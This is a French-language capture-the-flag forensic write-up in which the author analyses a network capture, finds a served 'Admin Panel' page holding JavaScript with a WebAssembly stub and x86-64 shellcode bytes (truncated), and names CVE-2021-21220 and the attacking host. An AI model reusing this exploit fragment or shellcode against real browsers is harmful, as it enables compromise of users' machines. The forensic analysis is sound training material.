---
title: "ThCon 2k25 : ne Click (1/4) | Forensic"
date: 2025-04-13
draft: false
categories: ["Forensic"]
ctf: "ThCon 2k25"
challenge: "ne Click (1/4)"
author: "Reyko"
---

## WU - One Click (1/4)   - Forensic - ThCon 2k25

### Contexte :

#### Nom :
One Click (1/4)

#### Enoncé :
S.N.A.F.U's leader, Axel Vaughn, has recently noticed slowdowns and unusual behavior on his personal computer. He fears that his computer may have been compromised. He is, however, careful about his internet browsing and claims not to have downloaded anything suspicious.

Axel provided us with a network capture that was made in his local network. Your mission is to investigate this potential attack and assess the extent of the damage.

If you identify something, retrieve the IPv4 address and port of the server used to deliver the attack, as well as the CVE number of the vulnerability exploited.

Flag format example: THC{1.2.3.4:5678-CVE-XXXX-YYYYY}

#### Ressource :

- capture.pcapng

### Solve :

Technique de flemmard :
"Effortless PCAP File Analysis in Your Browser" : https://apackets.com/

On upload simplement le fichier dans le tool, puis on voit rapidement des flux http contenant :

```
GET /signin.html HTTP/1.1
Host: 8000
Accept:  text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding:  gzip, deflate
Accept-Language:  en-US,en;q=0.9
Connection:  keep-alive
If-Modified-Since: 52 GMT
Purpose:  prefetch
Upgrade-Insecure-Requests:  1
User-Agent:  Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36

HTTP/1.0 200 OK
Connection: close
Content-Length: 4856
Content-Type: text/html
Date:16 GMT
Last-Modified:59 GMT
Server: SimpleHTTP/0.6 Python/3.10.12

<html>
<head>
<title>S.N.A.F.U - Admin Panel</title>
<script>
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11])
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var wasm_main_func = wasm_instance.exports.main;

var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);


var shellcode = new Uint8Array([0xe8,0x5a,0x0,0x0,0x0,0xc3,0x48,0xc7,0xc0,0x39,0x0,0x0,0x0,0xf,0x5,0xc3,0x48,0xc7,0xc0,0x3b,0x0,0x0,0x0,0xf,0x5,0xc3,0x48,0xc7,0xc0,0x2,0x0,0x0,0x0,0xf,0x5,0xc3,0x48,0xc7,0xc0,0x0,0x0,0x0,0x0,0xf,0x5,0xc3,0x48,0xc7,0xc0,0x1,0x0,0x0,0x0,0xf,0x5,0xc3,0x48,0xc7,0xc0,0x3,0x0,0x0,0x0,0xf,0x5,0xc3,0x48,0xc7,0xc0,0x3c,0x0,0x0,0x0,0xf,0
```

provenant de l'ip :
192.168.1.86:8000

Avec un peut "d'osint" en se basant sur le shellcode et le schéma d'attaque on tombe directement avec une recherche google dorker sur la CVE : CVE-2021-21220

Flag : THC{192.168.1.86:8000-CVE-2021-21220}
